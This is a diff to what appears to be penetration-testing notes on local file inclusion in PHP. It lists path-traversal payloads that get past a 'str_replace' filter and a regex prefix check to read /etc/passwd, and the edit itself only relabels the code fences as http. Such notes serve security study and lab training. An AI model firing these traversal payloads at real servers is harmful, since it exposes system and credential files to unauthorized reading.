@@ -4,22 +4,22 @@ Security Measure (Replace string)
 $language = str_replace('../', '', $_GET['language']);
 ```
 Bypass
-```
+```http
 http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd
 ```
-```
+```http
 http://<SERVER_IP>:<PORT>/index.php?language=..././..././..././..././etc/passwd
 ```
-```
+```http
 http://<SERVER_IP>:<PORT>/index.php?language=....\/....\/....\/....\/etc/passwd
 ```
-```
+```http
 http://<SERVER_IP>:<PORT>/index.php?language=....\/....\/....\/....\/etc/passwd
 ```
-```
+```http
 http://<SERVER_IP>:<PORT>/index.php?language=....////....////....////....////etc/passwd
 ```
-```
+```http
 http://<SERVER_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
 ```
 
@@ -32,7 +32,7 @@ if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
 }
 ```
 Bypass
-```
+```http
 http://<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
 ```
 
